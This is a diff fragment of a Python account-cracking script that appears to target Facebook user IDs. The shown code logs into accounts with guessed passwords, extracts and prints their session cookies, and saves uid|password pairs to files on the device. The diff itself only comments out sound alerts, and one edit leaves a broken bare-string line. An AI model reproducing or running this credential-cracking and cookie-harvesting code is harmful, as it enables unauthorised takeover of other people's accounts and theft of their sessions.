@@ -433,7 +433,7 @@ def rcrack1(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 coki1 = coki.split("1000")[1]
                 uid = "1000"+coki1[0:11]
-                os.system("play-audio Ariful_OK.mp3")
+                #os.system("play-audio Ariful_OK.mp3")
                 print(f'\r\x1b[38;5;46m[Ariful-OK] '+uid+' | '+ps+ ' '+Jawnx(uid)+' ')
                 print(f" Cookie : {coki}")
                 cek_apk(session,coki)
@@ -444,7 +444,7 @@ def rcrack1(uid,pwx,tl):
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     coki1 = coki.split("1000")[1]
                     uid = "1000"+coki1[0:11]
-                    os.system("play-audio Ariful_2F.mp3")
+                    #os.system("play-audio Ariful_2F.mp3")
                     print('\r\x1b[38;5;45m[Ariful-2F] '+uid+' | '+ps+' '+Jawnx(uid)+' ')
                     open('/sdcard/Ariful-2F.txt', 'a').write(uid+' | '+ps+'\n')
                     twf.append(uid)
@@ -452,8 +452,8 @@ def rcrack1(uid,pwx,tl):
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     coki1 = coki.split("1000")[1]
                     uid = "1000"+coki1[0:11]
-                    os.system("play-audio Ariful_CP.mp3")
-                    #(f'\r\x1b[38;5;191m[Ariful-CP] '+uid+' | '+ps+' '+Jawnx(uid)+' ')
+                    #.system("play-audio Ariful_CP.mp3")
+                    (f'\r\x1b[38;5;191m[Ariful-CP] '+uid+' | '+ps+' '+Jawnx(uid)+' ')
                     open('/sdcard/Ariful-CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
                     break
